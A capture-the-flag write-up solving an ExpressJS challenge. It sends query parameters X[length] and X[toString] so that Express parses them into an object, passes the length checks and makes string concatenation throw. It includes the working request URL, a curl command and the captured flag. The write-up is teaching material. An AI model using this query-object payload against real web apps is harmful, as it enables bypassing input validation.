# Gynvael Coldwind ExpressJS challenge 2

Source: https://twitter.com/gynvael/status/1257784735025291265

## Challenge

We are provided with this code on the web page:
```javascript
const express = require('express')
const fs = require('fs')

const PORT = 5002
const FLAG = process.env.FLAG || "???"
const SOURCE = fs.readFileSync('app.js')

const app = express()

app.get('/', (req, res) => {
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/plain;charset=utf-8')
  res.write("Level 2\n\n")

  if (!('X' in req.query)) {
    res.end(SOURCE)
    return
  }

  if (req.query.X.length > 800) {
    const s = JSON.stringify(req.query.X)
    if (s.length > 100) {
      res.end("Go away.")
      return
    }

    try {
      const k = '<' + req.query.X + '>'
      res.end("Close, but no cigar.")
    } catch {
      res.end(FLAG)
    }

  } else {
    res.end("No way.")
    return
  }
})

app.listen(PORT, () => {
  console.log(`Challenge listening at port ${PORT}`)
}) 
```

## Analysis

There is only one endpoint and we can specify the `X` query parameter. There are several conditions we need to trigger to get the flag:
- `req.query.X.length > 800`
- `s <= 100`
- exception trigger on `const k = '<' + req.query.X + '>'`

From the available [documentation](https://expressjs.com/en/api.html#req.query), notice that you can specify properties for a query param:

```
...
// GET /shoes?order=desc&shoe[color]=blue&shoe[type]=converse
console.dir(req.query.order)
// => 'desc'

console.dir(req.query.shoe.color)
// => 'blue'
...
```

This means that we can easily specify `X[length]` in the URL which will satisfy the first two conditions, the only thing that is left is the exception trigger.

Looking further in the documentation the following is noted:
> For example, req.query.foo.toString() may fail in multiple ways, for example foo may not be there or may not be a string, and toString may not be a function and instead a string or other user-input.

Well, sure, we can easily specify `X[toString]` in the URL and break the whole thing! ... Oh, wait ...

## Solution

Specify both `X[length]` and `X[toString]` in the URL so that they conform to challenge constraints. Here is one URL example on how to get the flag:

`http://challenges.gynvael.stream:5002/?X[length]=900&X[toString]=123`

This works because the `length` property is specified as integer and is greater than 800. At the same time, `length` property string length is less or equals than 100. The `toString` parameter will break the `const k = '<' + req.query.X + '>'` line because `toString` is the function called on object `X` under the hood. You can observe this behaviour in your browser console:

```javascript
>> X = {'a':1,'b':2}
Object { a: 1, b: 2 }
>> X.toString()
"[object Object]"
>> 'a'+X+'b'
"a[object Object]b"
```

Example in practice:
```
$ curl "http://challenges.gynvael.stream:5002/?X[length]=900&X[toString]=123"
Level 2

CTF{WaaayBeyondPHPLikeWTF}
```
